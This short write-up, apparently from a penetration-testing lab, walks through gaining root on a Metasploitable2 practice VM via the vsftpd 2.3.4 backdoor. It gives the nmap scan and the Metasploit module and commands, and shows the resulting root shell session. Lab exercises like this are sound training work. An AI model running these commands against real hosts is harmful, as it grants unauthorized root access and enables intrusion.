#  Exploiting VSFTPD 2.3.4 Backdoor (Metasploitable2)

## 🔍 Target Info

- **Target IP:** 192.168.56.101
- **Service:** FTP (vsftpd 2.3.4)
- **Tool Used:** Nmap, Metasploit
- **Exploit Module:** `exploit/unix/ftp/vsftpd_234_backdoor`

---

## 🔎 Nmap Service Scan

```bash
nmap -sS -sV -T4 -Pn 192.168.56.101

Output
21/tcp   open  ftp         vsftpd 2.3.4

Exploitation with Metasploit
Metasploit Module Used:exploit/unix/ftp/vsftpd_234_backdoor

Steps:
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run

Results:
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.106:44225 -> 192.168.56.101:6200)

Summary
Successfully exploited the vsftpd 2.3.4 backdoor and gained root shell access on the target
